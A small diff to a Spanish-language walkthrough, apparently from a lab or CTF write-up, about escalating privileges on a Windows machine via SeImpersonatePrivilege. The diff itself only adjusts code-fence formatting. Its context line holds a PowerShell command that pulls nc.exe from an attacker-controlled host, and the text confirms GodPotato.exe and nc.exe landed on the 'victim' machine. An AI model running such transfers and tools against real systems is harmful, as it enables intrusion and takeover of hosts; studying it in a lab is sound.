@@ -21,8 +21,8 @@ Invoke-WebRequest -Uri "http://myipaddress:8000/nc.exe" -OutFile "nc.exe"
 ```
 
 Comprobamos que ambos binarios hayan sido transferidos correctamente:
-
+``
 dir GodPotato.exe
 dir nc.exe
-
+``
 Con las herramientas disponibles en la máquina víctima, podemos continuar con la explotación de ```SeImpersonatePrivilege.```
